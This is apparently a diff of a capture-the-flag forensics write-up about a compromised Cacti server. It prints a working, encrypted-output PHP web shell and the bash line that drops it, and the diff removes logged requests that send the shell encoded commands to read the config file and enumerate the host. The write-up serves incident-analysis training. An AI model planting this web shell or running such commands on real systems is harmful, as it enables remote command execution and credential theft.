@@ -43,20 +43,32 @@ Flag: `JWUA5a1yj.php,ornF85gfQ.php,f54Avbg4.php`
 
 <img width="1114" height="274" alt="Screenshot at 2025-12-26 16-02-12" src="https://github.com/user-attachments/assets/0b432d6c-3d44-4614-8d4e-65417b11ded3" />
 
-```
-GET /cacti/f54Avbg4.php?q=Y2F0IGluY2x1ZGUvY29uZmlnLnBocA== HTTP/1.1
-GET /cacti/f54Avbg4.php?q=bHMgLWxhIGluY2x1ZGUv HTTP/1.1
-GET /cacti/f54Avbg4.php?q=bHMgLWxh HTTP/1.1
-GET /cacti/f54Avbg4.php?q=cHdk HTTP/1.1
-GET /cacti/f54Avbg4.php?q=aG9zdG5hbWU= HTTP/1.1
-GET /cacti/f54Avbg4.php?q=aWQ= HTTP/1.1
-```
+<img width="738" height="716" alt="Screenshot at 2025-12-26 16-18-19" src="https://github.com/user-attachments/assets/74109762-5c24-4a0b-b131-2c895a167997" />
+
+Flag: `bash`
 
 # Flag 5
 ### What is the name of the variable in one of the three malicious PHP files that stores the result of the executed system command? (e.g., $q5ghsA)
+If we try to decode the following injected shell script:
+
+```
+#!/bin/bash
+echo PD9waHAgJEE0Z1ZhR3pIID0gImtGOTJzTDBwUXc4ZVR6MTdhQjR4TmM5VlVtM3lIZDZHIjskQTRnVmFSbVYgPSAicFo3cVIxdEx3OERmM1hiSyI7JEE0Z1ZhWHpZID0gYmFzZTY0X2RlY29kZSgkX0dFVFsicSJdKTskYTU0dmFnID0gc2hlbGxfZXhlYygkQTRnVmFYelkpOyRBNGdWYVFkRiA9IG9wZW5zc2xfZW5jcnlwdCgkYTU0dmFnLCJBRVMtMjU2LUNCQyIsJEE0Z1ZhR3pILE9QRU5TU0xfUkFXX0RBVEEsJEE0Z1ZhUm1WKTtlY2hvIGJhc2U2NF9lbmNvZGUoJEE0Z1ZhUWRGKTsgPz4=|base64 --decode > f54Avbg4.php
+```
+
+We will get this decoded php script:
+```
+<?php $A4gVaGzH = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G";$A4gVaRmV = "pZ7qR1tLw8Df3XbK";$A4gVaXzY = base64_decode($_GET["q"]);$a54vag = shell_exec($A4gVaXzY);$A4gVaQdF = openssl_encrypt($a54vag,"AES-256-CBC",$A4gVaGzH,OPENSSL_RAW_DATA,$A4gVaRmV);echo base64_encode($A4gVaQdF); ?>
+```
+
+Analyzing it further tells us that the variable `$a54vag` executes the shell commands of the variable `$A4gVaXzY` which decodes the base64 script with the `q` request.
+
+Flag: `$a54vag`
 
 # Flag 6
 ### What is the system machine hostname? (e.g. server01)
+
+From analysing
 
 # Flag 7
 ### What is the database password used by Cacti? (e.g. Password123)
